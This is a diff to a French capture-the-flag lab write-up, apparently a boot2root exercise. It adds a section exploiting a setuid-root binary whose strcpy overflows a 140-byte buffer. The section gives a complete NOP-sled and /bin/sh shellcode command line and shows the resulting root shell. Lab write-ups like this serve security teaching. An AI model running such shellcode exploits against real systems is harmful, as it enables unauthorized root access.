@@ -571,4 +571,56 @@ Après exécution , les lettre `S` `L` `A` `S` `H` ont été dessinées.
 
 Nous essayons donc `zaz:SLASH`, ce qui ne fonctionne pas. Grâce à [ce site](http://hash-functions.online-domain-tools.com/), nous trouvons qu'il faut passer `SLASH` dans un algorithme de cryptage MD5 pour obtenir le bon mot de passe.
 
-La bonne combinaison pour l'utilisateur suivant est donc : `zaz:646da671ca01bb5d84dbb5fb2238dc8e`
+La bonne combinaison pour l'utilisateur suivant est donc : `zaz:`
+
+## Zaz
+
+En se connectant, on trouve cette fois un dossier `mail` contenant des fichiers vides et un exécutable `exploit_me` qui a la particularité d'appartenir à `root`... ça sent bon !
+
+On extrait donc l'exécutable de la VM pour pouvoir l'analyser.
+
+```C
+int main(int argc, char **argv)
+{
+    char buffer[140];
+
+    if (argc > 1) {
+        strcpy(buffer, argv[1]);
+        puts(buffer);
+    }
+    return argc < 2;
+}
+```
+
+Nous avons là un simple `main` qui déclare un buffer, copie le premier argument du programme dedans et l'affiche ensuite.
+
+Le problème est que pour copier la chaîne de caractères, le programme utilise la fonction `strcpy` qui est vulnérable aux attaques de type `buffer overflow` car elle ne vérifie pas le nombre de caractères qu'elle copie. Il nous suffit donc de passer en argument une chaine de caractères de 140 caractères ou plus pour que le programme segfault.
+
+Cela nous indique que du caractère 141 au 144 nous pouvons passer l'adresse d'un code qui sera exécuté par le programme alors qu'il devait se terminer.
+
+Nous allons passer l'adresse d'un `shellcode`, un bout de code malicieux qui va faire exécuter la commande `/bin/sh` par le programme, et donc nous ouvrir un shell `root`.
+
+![buffer_overflow](/images/buffer_overflow.png)
+
+Le format de commande est le suivant :
+
+`./exploit me $(python -c 'print("nopslide" + "shellcode" + "adresse dans la nopslide")')`
+
+L'adresse de la nopslide sera l'adresse du début du buffer qui est à `$esp + 0x10` donc `0xbffff640`
+
+Notre commande finale est donc :
+
+`./exploit_me $(python -c 'print("\x90"*95 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\xbf\xff\xf6\x50"[::-1])')`
+
+```shell
+$ ./exploit_me $(python -c 'print("\x90"*95 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\xbf\xff\xf6\x50"[::-1])')
+^1��FF
+
+      V
+      ̀1ۉ@̀/bin/shP
+# id
+uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
+# whoami
+root
+#
+```
